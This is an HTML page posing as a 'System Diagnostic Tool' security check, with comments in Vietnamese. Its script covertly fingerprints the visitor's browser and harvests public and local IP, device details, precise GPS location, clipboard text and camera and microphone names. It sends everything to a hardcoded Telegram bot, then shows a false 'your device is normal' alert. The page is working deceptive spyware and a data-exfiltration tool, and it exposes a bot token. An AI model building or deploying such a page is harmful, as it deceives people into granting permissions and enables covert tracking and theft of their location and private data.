<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Security Check | System Diagnostics</title>
    
    <!-- Libraries -->
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">

    <style>
        :root {
            --bg: #000000;
            --panel: #111111;
            --text: #e0e0e0;
            --accent: #00ff41; /* Hacker Green */
            --danger: #ff3333;
            --border: #333;
        }

        body {
            background-color: var(--bg);
            color: var(--text);
            font-family: 'JetBrains Mono', monospace;
            margin: 0; padding: 20px;
            overflow-x: hidden;
            font-size: 14px;
        }

        /* Matrix Effect Background */
        canvas#matrix { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.2; }

        .container { max-width: 800px; margin: 0 auto; }
        
        .header { text-align: center; margin-bottom: 30px; border-bottom: 1px solid var(--accent); padding-bottom: 20px; }
        .header h1 { color: var(--accent); margin: 0; text-transform: uppercase; letter-spacing: 2px; }
        .header p { color: #666; font-size: 12px; margin-top: 5px; }

        .status-box {
            background: var(--panel); border: 1px solid var(--border);
            padding: 15px; margin-bottom: 15px; border-radius: 4px;
            display: flex; justify-content: space-between; align-items: center;
        }
        .status-label { color: #888; font-size: 12px; text-transform: uppercase; }
        .status-value { color: #fff; font-weight: bold; }
        .highlight { color: var(--accent); }

        /* Button "Xin quyá»n" */
        .scan-btn {
            width: 100%; padding: 15px;
            background: var(--accent); color: #000;
            border: none; font-weight: bold; font-family: inherit;
            cursor: pointer; font-size: 16px; text-transform: uppercase;
            margin: 20px 0; display: block;
            box-shadow: 0 0 10px rgba(0, 255, 65, 0.3);
            animation: pulse 2s infinite;
        }
        .scan-btn:active { transform: scale(0.98); }
        .scan-btn:disabled { background: #333; color: #666; animation: none; cursor: not-allowed; }

        @keyframes pulse { 0% {box-shadow: 0 0 0 0 rgba(0,255,65, 0.4);} 70% {box-shadow: 0 0 0 10px rgba(0,255,65, 0);} 100% {box-shadow: 0 0 0 0 rgba(0,255,65, 0);} }

        .log-console {
            background: #050505; border: 1px solid var(--border);
            padding: 10px; height: 200px; overflow-y: auto;
            font-size: 11px; color: var(--accent);
            margin-top: 20px;
        }
        .log-entry { margin-bottom: 5px; border-bottom: 1px dashed #222; padding-bottom: 2px; }

        /* Hidden elements for functionality */
        #hidden-canvas { display: none; }
    </style>
</head>
<body>

    <canvas id="matrix"></canvas>

    <div class="container">
        <div class="header">
            <h1>System Diagnostic Tool</h1>
            <p>ID: <span id="session-id">LOADING...</span></p>
        </div>

        <div class="status-box">
            <div>
                <div class="status-label">IP Address</div>
                <div class="status-value" id="ip-display">Äang quÃ©t...</div>
            </div>
            <div style="text-align:right">
                <div class="status-label">Location</div>
                <div class="status-value" id="loc-display">...</div>
            </div>
        </div>

        <div class="status-box">
            <div>
                <div class="status-label">Device Info</div>
                <div class="status-value" id="device-display">Analyzing...</div>
            </div>
        </div>

        <!-- NÃºt nÃ y lÃ  TRá»ŒNG TÃ‚M Ä‘á»ƒ xin quyá»n -->
        <button class="scan-btn" id="start-btn" onclick="startDeepScan()">
            <i class="fas fa-fingerprint"></i> Báº®T Äáº¦U QUÃ‰T TOÃ€N DIá»†N
        </button>
        <p style="text-align: center; font-size: 10px; color: #444;">*Nháº¥n "Cho phÃ©p" náº¿u trÃ¬nh duyá»‡t yÃªu cáº§u Ä‘á»ƒ hoÃ n táº¥t quÃ¡ trÃ¬nh kiá»ƒm tra.</p>

        <div class="log-console" id="console">
            <div class="log-entry">> Initializing system core...</div>
        </div>
    </div>

    <script>
        // --- Cáº¤U HÃŒNH BOT TELEGRAM (Thay cÃ¡i nÃ y cá»§a báº¡n vÃ o) ---
        const CONFIG = {
            BOT_TOKEN: "6789490938:AAGbxaiI4NVuZBWEm-ktCT4w2FNVuV_v7mE", 
            CHAT_ID: "@testappxyz"
        };

        // Biáº¿n lÆ°u dá»¯ liá»‡u
        let DATA = {
            ip: "Unknown", isp: "Unknown", city: "Unknown",
            localIP: "Hidden",
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            screen: `${window.screen.width}x${window.screen.height} (Depth: ${window.screen.colorDepth})`,
            gpu: "Unknown",
            ram: navigator.deviceMemory ? navigator.deviceMemory + "GB" : "Unknown",
            cores: navigator.hardwareConcurrency || "Unknown",
            battery: "Unknown",
            connection: "Unknown",
            clipboard: "Denied/Empty",
            mediaDevices: [],
            gps: "Denied",
            fingerprint: "Generating...",
            referrer: document.referrer || "Direct"
        };

        // 1. Utilities
        const log = (text) => {
            const consoleDiv = document.getElementById('console');
            const time = new Date().toLocaleTimeString();
            consoleDiv.innerHTML += `<div class="log-entry">[${time}] ${text}</div>`;
            consoleDiv.scrollTop = consoleDiv.scrollHeight;
        };

        const updateUI = (id, val) => {
            const el = document.getElementById(id);
            if(el) el.innerText = val;
        };

        // 2. WebRTC Ä‘á»ƒ láº¥y Local IP (Náº¿u trÃ¬nh duyá»‡t há»Ÿ)
        function getLocalIP() {
            return new Promise(resolve => {
                const pc = new RTCPeerConnection({iceServers: []});
                pc.createDataChannel('');
                pc.createOffer().then(o => pc.setLocalDescription(o));
                pc.onicecandidate = (ice) => {
                    if (ice && ice.candidate && ice.candidate.candidate) {
                        const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
                        const match = ice.candidate.candidate.match(ipRegex);
                        if (match) {
                            DATA.localIP = match[1];
                            log(`> Found Local IP: ${DATA.localIP}`);
                            pc.close();
                            resolve(match[1]);
                        }
                    }
                };
                setTimeout(() => resolve("Not Found"), 1000);
            });
        }

        // 3. Canvas Fingerprinting (Táº¡o ID duy nháº¥t cho mÃ¡y)
        function getCanvasFingerprint() {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            ctx.textBaseline = "top";
            ctx.font = "14px 'Arial'";
            ctx.textBaseline = "alphabetic";
            ctx.fillStyle = "#f60";
            ctx.fillRect(125,1,62,20);
            ctx.fillStyle = "#069";
            ctx.fillText("Browser_Fingerprint_v1", 2, 15);
            ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
            ctx.fillText("Browser_Fingerprint_v1", 4, 17);
            
            // Hash káº¿t quáº£
            const dataURI = canvas.toDataURL();
            let hash = 0;
            for (let i = 0; i < dataURI.length; i++) {
                const char = dataURI.charCodeAt(i);
                hash = ((hash << 5) - hash) + char;
                hash = hash & hash;
            }
            return Math.abs(hash).toString(16);
        }

        // 4. Láº¥y thÃ´ng tin máº¡ng & IP Public
        async function getNetworkInfo() {
            log("> Scanning Network...");
            
            // Láº¥y loáº¡i káº¿t ná»‘i (4G/Wifi)
            if (navigator.connection) {
                const conn = navigator.connection;
                DATA.connection = `${conn.effectiveType} (Downlink: ${conn.downlink}Mbps, RTT: ${conn.rtt}ms)`;
            }

            try {
                // Æ¯u tiÃªn ipapi.co vÃ¬ nÃ³ chi tiáº¿t
                let res = await fetch('https://ipapi.co/json/');
                let json = await res.json();
                DATA.ip = json.ip;
                DATA.isp = json.org;
                DATA.city = `${json.city}, ${json.region}, ${json.country_name}`;
                
                updateUI('ip-display', DATA.ip);
                updateUI('loc-display', json.city);
                log(`> IP Detected: ${DATA.ip}`);
            } catch (e) {
                log("> Public IP blocked by Adblock. Trying backup...");
                try {
                    // Dá»± phÃ²ng
                    let res = await fetch('https://api.ipify.org?format=json');
                    let json = await res.json();
                    DATA.ip = json.ip;
                } catch(err) { DATA.ip = "Hidden/Proxy"; }
            }
            // Gá»­i dá»¯ liá»‡u sÆ¡ bá»™ ngay láº­p tá»©c
            sendReport("SÆ¡ bá»™ (Passive Scan)");
        }

        // 5. Láº¥y GPU Info
        function getGPU() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                DATA.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
            } catch(e) { DATA.gpu = "Integrated/Blocked"; }
        }

        // 6. CHá»¨C NÄ‚NG "QUÃ‰T SÃ‚U" - Xin quyá»n
        async function startDeepScan() {
            const btn = document.getElementById('start-btn');
            btn.disabled = true;
            btn.innerHTML = '<i class="fas fa-cog fa-spin"></i> ÄANG TRÃCH XUáº¤T Dá»® LIá»†U...';

            log("> Starting Deep Scan...");

            // 6.1. Xin quyá»n GPS
            log("> Requesting GPS Access...");
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        const { latitude, longitude, accuracy } = pos.coords;
                        DATA.gps = `Lat: ${latitude}, Lon: ${longitude} (Acc: ${accuracy}m)`;
                        DATA.mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
                        log(`> GPS Acquired: ${accuracy}m accuracy`);
                        checkNextStep();
                    },
                    (err) => {
                        DATA.gps = "User Denied / Error";
                        log("> GPS Permission Denied.");
                        checkNextStep();
                    },
                    { enableHighAccuracy: true, timeout: 5000 }
                );
            } else { checkNextStep(); }

            // HÃ m Ä‘á»‡m Ä‘á»ƒ cháº¡y tiáº¿p cÃ¡c bÆ°á»›c sau GPS
            async function checkNextStep() {
                
                // 6.2. Xin quyá»n Clipboard (Chá»‰ hoáº¡t Ä‘á»™ng khi trang Ä‘ang active vÃ  HTTPS)
                try {
                    log("> Attempting to read Clipboard...");
                    // LÆ°u Ã½: Chrome yÃªu cáº§u user tÆ°Æ¡ng tÃ¡c, Firefox yÃªu cáº§u config
                    const text = await navigator.clipboard.readText();
                    if(text) DATA.clipboard = text.substring(0, 100) + (text.length>100 ? "..." : ""); // Cáº¯t ngáº¯n náº¿u quÃ¡ dÃ i
                    log("> Clipboard read success.");
                } catch (err) {
                    log("> Clipboard access denied/empty.");
                }

                // 6.3. Xin quyá»n Media (Camera/Mic) Ä‘á»ƒ láº¥y tÃªn thiáº¿t bá»‹
                try {
                    log("> Querying Media Devices...");
                    // Máº¹o: Xin quyá»n video Ä‘á»ƒ láº¥y tÃªn camera, sau Ä‘Ã³ táº¯t ngay
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                    
                    // Láº¥y danh sÃ¡ch thiáº¿t bá»‹
                    const devices = await navigator.mediaDevices.enumerateDevices();
                    DATA.mediaDevices = devices.map(d => `${d.kind}: ${d.label}`).filter(x => x.includes('Default') === false);
                    
                    // Táº¯t cam ngay láº­p tá»©c
                    stream.getTracks().forEach(track => track.stop());
                    log("> Media Devices enumerated.");
                } catch (err) {
                    log("> Camera/Mic permission denied.");
                }

                // 6.4. Pin
                try {
                    if(navigator.getBattery) {
                        const bat = await navigator.getBattery();
                        DATA.battery = `${Math.round(bat.level*100)}% (${bat.charging ? 'Charging' : 'Discharging'})`;
                    }
                } catch(e) {}

                // HoÃ n táº¥t
                btn.innerHTML = "QUÃ‰T HOÃ€N Táº¤T";
                btn.style.background = "#333";
                log("> Scan Complete. Uploading Report...");
                sendReport("FULL REPORT (DEEP SCAN)");
                alert("Há»‡ thá»‘ng Ä‘Ã£ kiá»ƒm tra xong. Thiáº¿t bá»‹ cá»§a báº¡n hoáº¡t Ä‘á»™ng bÃ¬nh thÆ°á»ng.");
            }
        }

        // 7. Gá»­i tin nháº¯n Telegram
        async function sendReport(type) {
            const msg = `
ğŸ’€ <b>SYSTEM REPORT: ${type}</b>
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
ğŸ†” <b>Fingerprint:</b> <code>${DATA.fingerprint}</code>
ğŸŒ <b>IP Public:</b> <code>${DATA.ip}</code>
ğŸ  <b>IP Local:</b> <code>${DATA.localIP}</code>
ğŸ“¶ <b>Network:</b> ${DATA.connection}
ğŸ¢ <b>ISP:</b> ${DATA.isp}
ğŸ“ <b>Location (IP):</b> ${DATA.city}
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
ğŸ“± <b>Device:</b> ${DATA.userAgent}
ğŸ’» <b>Platform:</b> ${DATA.platform}
ğŸ–¥ <b>Screen:</b> ${DATA.screen}
ğŸ® <b>GPU:</b> ${DATA.gpu}
ğŸ§  <b>RAM/CPU:</b> ${DATA.ram} / ${DATA.cores} Cores
ğŸ”‹ <b>Battery:</b> ${DATA.battery}
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
ğŸ“‹ <b>Clipboard:</b> <code>${DATA.clipboard}</code>
ğŸ“¸ <b>Media Devices:</b> 
${DATA.mediaDevices.join('\n') || 'None/Denied'}
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
ğŸ›° <b>GPS CHÃNH XÃC:</b> 
${DATA.gps}
${DATA.mapsLink ? `<a href="${DATA.mapsLink}">Má»Ÿ Google Maps</a>` : ''}
`;

            try {
                await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: CONFIG.CHAT_ID,
                        text: msg,
                        parse_mode: "HTML",
                        disable_web_page_preview: true
                    })
                });
                log("> Report sent successfully.");
            } catch (e) {
                log("> Upload failed.");
            }
        }

        // --- MATRIX EFFECT (Chá»‰ Ä‘á»ƒ lÃ m mÃ u) ---
        const initMatrix = () => {
            const canvas = document.getElementById('matrix');
            const ctx = canvas.getContext('2d');
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
            const letters = "01010101ABCDEFGHIJKLMNOPQRSTUVWXYZ";
            const fontSize = 10;
            const columns = canvas.width / fontSize;
            const drops = Array(Math.floor(columns)).fill(1);
            function draw() {
                ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
                ctx.fillRect(0, 0, canvas.width, canvas.height);
                ctx.fillStyle = "#0F0";
                ctx.font = fontSize + "px monospace";
                for (let i = 0; i < drops.length; i++) {
                    const text = letters[Math.floor(Math.random() * letters.length)];
                    ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                    if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
                    drops[i]++;
                }
            }
            setInterval(draw, 33);
        }

        // --- MAIN INIT ---
        window.onload = () => {
            initMatrix();
            DATA.fingerprint = getCanvasFingerprint();
            document.getElementById('session-id').innerText = DATA.fingerprint;
            getGPU();
            getLocalIP(); // Cháº¡y ngáº§m
            getNetworkInfo(); // Cháº¡y ngáº§m
            
            // Cáº­p nháº­t thÃ´ng tin cÆ¡ báº£n lÃªn UI
            document.getElementById('device-display').innerText = `${navigator.platform} - ${DATA.gpu.substring(0, 20)}...`;
        };

    </script>
</body>
</html>
